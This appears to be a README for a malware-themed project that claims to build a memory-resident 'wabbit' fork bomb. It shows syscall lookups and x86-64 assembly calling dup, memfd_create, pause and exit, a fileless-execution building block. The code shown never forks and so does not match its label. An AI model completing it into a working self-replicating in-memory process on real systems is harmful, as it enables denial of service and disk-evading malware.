# Gaslit_Wabbit
1978 wabbit fork bomb running in Ram

first we get the syscall numbers for
- memfd_create
- pause
- exit

```shell
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep memfd_create
```
- ```#define __NR_memfd_create 319```

```shell
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep pause
```
- ```#define __NR_pause 34```

```shell
cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep exit
```
- ```#define __NR_exit 60```



next we create some assembly that will
- duplicate FDs: 10 and 11
```asm
xor rax, rax
xor rdi, rdi
mov di, 10
mov rax, 0x20
syscall
xor rax, rax
inc rdi
mov rax, 0x20
syscall
```
- create an in-memory-only file (syscall 319)
```asm
push 0x78436f73
mov rdi, rsp
mov rsi, 0
mov rax, 319
syscall
```
- suspend the process (syscall 34)
- exit process (syscall 60) (should never be reached)

```asm
BITS 64
global _start
section .text
_start:
        xor rax, rax
        xor rdi, rdi
        mov di, 10
        mov rax, 0x20
        syscall
        xor rax, rax
        inc rdi
        mov rax, 0x20
        syscall
memfd_create:
        push 0x78436f73
        mov rdi, rsp
        mov rsi, 0
        mov rax, 319
        syscall
pause:
        mov rax, 34
        syscall
exit:
        xor rax, rax
        add rax, 60
        xor rdi, rdi
        syscall
```